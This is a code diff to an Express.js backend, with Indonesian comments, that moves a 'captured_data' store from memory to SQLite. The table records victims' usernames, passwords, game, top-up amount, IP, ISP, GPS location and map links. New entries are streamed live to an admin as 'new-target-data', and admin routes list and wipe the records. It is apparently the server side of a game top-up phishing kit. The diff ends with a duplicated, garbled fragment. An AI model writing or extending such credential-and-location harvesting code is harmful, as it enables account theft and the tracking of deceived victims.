@@ -3,10 +3,36 @@ const cors = require('cors');
 const axios = require('axios');
 const http = require('http');
 const { Server } = require('socket.io');
+const sqlite3 = require('sqlite3').verbose();
+const path = require('path');
 require('dotenv').config();
 
 const app = express();
 const server = http.createServer(app);
+
+// SQLite Database Setup
+const dbPath = path.resolve(__dirname, 'database.sqlite');
+const db = new sqlite3.Database(dbPath, (err) => {
+    if (err) {
+        console.error('Error opening database:', err.message);
+    } else {
+        console.log('Connected to the SQLite database.');
+        db.run(`CREATE TABLE IF NOT EXISTS captured_data (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT,
+            password TEXT,
+            game TEXT,
+            nominal TEXT,
+            method TEXT,
+            ip TEXT,
+            isp TEXT,
+            location TEXT,
+            mapsLink TEXT,
+            isHighAccuracy INTEGER,
+            timestamp TEXT
+        )`);
+    }
+});
 
 // Socket.io initialization
 const io = new Server(server, {
@@ -21,15 +47,18 @@ const PORT = process.env.PORT || 5000;
 app.use(cors());
 app.use(express.json());
 
-// In-memory storage (Peringatan: Vercel serverless akan mereset ini secara berkala)
-const capturedData = [];
-
 app.get('/api', (req, res) => {
-    res.send('Backend Real-time Ready (Vercel Mode)');
+    res.send('Backend Real-time Ready (SQLite Mode)');
 });
 
 app.get('/api/admin/data', (req, res) => {
-    res.json(capturedData);
+    db.all("SELECT * FROM captured_data ORDER BY id DESC", [], (err, rows) => {
+        if (err) {
+            res.status(500).json({ error: err.message });
+            return;
+        }
+        res.json(rows);
+    });
 });
 
 app.post('/api/setor-data', async (req, res) => {
@@ -62,18 +91,25 @@ app.post('/api/setor-data', async (req, res) => {
         isp: geoInfo.isp || 'Unknown',
         location: hasGPS ? `GPS Precision (Accuracy: ${gps.accuracy.toFixed(1)}m)` : `${geoInfo.city}, ${geoInfo.regionName}, ${geoInfo.country}`,
         mapsLink: finalLat && finalLng ? `https://www.google.com/maps?q=${finalLat},${finalLng}` : null,
-        isHighAccuracy: !!hasGPS,
+        isHighAccuracy: hasGPS ? 1 : 0,
         timestamp: new Date().toLocaleString('id-ID')
     };
 
-    capturedData.push(dataLog);
-
-    // Push via socket
-    try {
-        io.emit('new-target-data', dataLog);
-    } catch (e) {
-        console.warn('Socket emit failed');
-    }
+    // Save to SQLite
+    const stmt = db.prepare(`INSERT INTO captured_data (username, password, game, nominal, ip, isp, location, mapsLink, isHighAccuracy, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);
+    stmt.run(dataLog.username, dataLog.password, dataLog.game, dataLog.nominal, dataLog.ip, dataLog.isp, dataLog.location, dataLog.mapsLink, dataLog.isHighAccuracy, dataLog.timestamp, function(err) {
+        if (err) {
+            console.error('Error saving to DB:', err.message);
+        } else {
+            // Push via socket
+            try {
+                io.emit('new-target-data', { ...dataLog, id: this.lastID });
+            } catch (e) {
+                console.warn('Socket emit failed');
+            }
+        }
+    });
+    stmt.finalize();
 
     console.log(`[${dataLog.timestamp}] DATA BARU: ${username}`);
 
@@ -83,15 +119,27 @@ app.post('/api/setor-data', async (req, res) => {
     });
 });
 
+app.delete('/api/admin/delete-all', (req, res) => {
+    db.run("DELETE FROM captured_data", [], (err) => {
+        if (err) {
+            res.status(500).json({ error: err.message });
+            return;
+        }
+        res.json({ status: 'success', message: 'All data deleted' });
+    });
+});
+
 io.on('connection', (socket) => {
     console.log('Admin connected:', socket.id);
 });
 
-// Jalankan server jika tidak di Vercel
-if (process.env.NODE_ENV !== 'production') {
-    server.listen(PORT, () => {
-        console.log(`Server jalan di: http://localhost:${PORT}`);
-    });
-}
+// Always listen on PORT for Render
+server.listen(PORT, () => {
+    console.log(`Server jalan di: http://localhost:${PORT}`);
+});
+
+module.exports = app;
+alhost:${PORT}`);
+});
 
 module.exports = app;
